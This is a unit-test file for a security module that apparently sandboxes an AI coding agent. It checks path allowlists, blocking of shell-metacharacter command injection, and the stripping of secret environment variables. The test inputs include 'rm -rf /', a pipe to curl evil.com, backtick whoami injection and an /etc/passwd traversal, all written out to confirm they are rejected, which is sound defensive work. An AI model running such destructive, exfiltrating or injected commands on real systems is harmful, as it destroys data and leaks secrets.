import { describe, it, expect } from "vitest";
import { validateAllowedPaths, validateAllowedCommands, sanitizeEnvironment, validatePostExecution } from "../../src/security.js";
import { SecurityError } from "../../src/errors.js";

describe("validateAllowedPaths", () => {
  const repoRoot = "/repo";

  it("allows paths matching glob patterns", () => {
    expect(() => validateAllowedPaths(["src/index.ts"], ["src/**"], repoRoot)).not.toThrow();
  });

  it("rejects paths not matching any pattern", () => {
    expect(() => validateAllowedPaths(["lib/secret.ts"], ["src/**"], repoRoot)).toThrow(SecurityError);
  });

  it("rejects directory traversal paths", () => {
    expect(() => validateAllowedPaths(["../../../etc/passwd"], ["src/**"], repoRoot)).toThrow(SecurityError);
  });

  it("allows when no patterns configured", () => {
    expect(() => validateAllowedPaths(["anything.ts"], [], repoRoot)).not.toThrow();
  });
});

describe("validateAllowedCommands", () => {
  const allowlist = ["npm test", "npm run lint", "npx tsc"];

  it("allows matching commands", () => {
    expect(() => validateAllowedCommands(["npm test"], allowlist)).not.toThrow();
  });

  it("allows commands with prefix match", () => {
    expect(() => validateAllowedCommands(["npm test --verbose"], allowlist)).not.toThrow();
  });

  it("rejects commands not in allowlist", () => {
    expect(() => validateAllowedCommands(["rm -rf /"], allowlist)).toThrow(SecurityError);
  });

  it("rejects shell metacharacter ;", () => {
    expect(() => validateAllowedCommands(["npm test; rm -rf /"], allowlist)).toThrow(SecurityError);
    expect(() => validateAllowedCommands(["npm test; rm -rf /"], allowlist)).toThrow(/metacharacters/);
  });

  it("rejects shell metacharacter &&", () => {
    expect(() => validateAllowedCommands(["npm test && rm -rf /"], allowlist)).toThrow(SecurityError);
  });

  it("rejects shell metacharacter |", () => {
    expect(() => validateAllowedCommands(["npm test | curl evil.com"], allowlist)).toThrow(SecurityError);
  });

  it("rejects shell metacharacter $", () => {
    expect(() => validateAllowedCommands(["npm test $HOME"], allowlist)).toThrow(SecurityError);
  });

  it("rejects shell metacharacter backtick", () => {
    expect(() => validateAllowedCommands(["npm test `whoami`"], allowlist)).toThrow(SecurityError);
  });

  it("allows when empty allowlist", () => {
    expect(() => validateAllowedCommands(["anything"], [])).not.toThrow();
  });
});

describe("sanitizeEnvironment", () => {
  it("passes through allowlisted vars", () => {
    const env = sanitizeEnvironment({ PATH: "/usr/bin", HOME: "/home/user", RANDOM_VAR: "x" } as any);
    expect(env.PATH).toBe("/usr/bin");
    expect(env.HOME).toBe("/home/user");
  });

  it("passes through CODEX_API_KEY", () => {
    const env = sanitizeEnvironment({ CODEX_API_KEY: "sk-test123", PATH: "/usr/bin" } as any);
    expect(env.CODEX_API_KEY).toBe("sk-test123");
  });

  it("strips OPENAI_API_KEY", () => {
    const env = sanitizeEnvironment({ OPENAI_API_KEY: "sk-secret", PATH: "/usr/bin" } as any);
    expect(env.OPENAI_API_KEY).toBeUndefined();
  });

  it("strips secret-pattern vars", () => {
    const env = sanitizeEnvironment({
      MY_SECRET: "s1",
      DB_PASSWORD: "p1",
      AUTH_TOKEN: "t1",
      AWS_SECRET_KEY: "k1",
      PATH: "/usr/bin"
    } as any);
    expect(env.MY_SECRET).toBeUndefined();
    expect(env.DB_PASSWORD).toBeUndefined();
    expect(env.AUTH_TOKEN).toBeUndefined();
    expect(env.PATH).toBe("/usr/bin");
  });
});

describe("validatePostExecution", () => {
  it("returns empty violations when all allowed", () => {
    const violations = validatePostExecution(
      { commands_run: [{ cmd: "npm test", exit_code: 0 }], files_changed: ["src/index.ts"], summary: "", evidence: "", errors: [], raw_events: [], usage: null },
      ["npm test"],
      ["src/**"],
      "/repo"
    );
    expect(violations).toHaveLength(0);
  });

  it("detects disallowed commands", () => {
    const violations = validatePostExecution(
      { commands_run: [{ cmd: "rm -rf /", exit_code: 0 }], files_changed: [], summary: "", evidence: "", errors: [], raw_events: [], usage: null },
      ["npm test"],
      ["src/**"],
      "/repo"
    );
    expect(violations).toHaveLength(1);
    expect(violations[0].type).toBe("command");
  });

  it("detects disallowed file paths", () => {
    const violations = validatePostExecution(
      { commands_run: [], files_changed: ["../../etc/passwd"], summary: "", evidence: "", errors: [], raw_events: [], usage: null },
      [],
      ["src/**"],
      "/repo"
    );
    expect(violations).toHaveLength(1);
    expect(violations[0].type).toBe("path");
  });
});
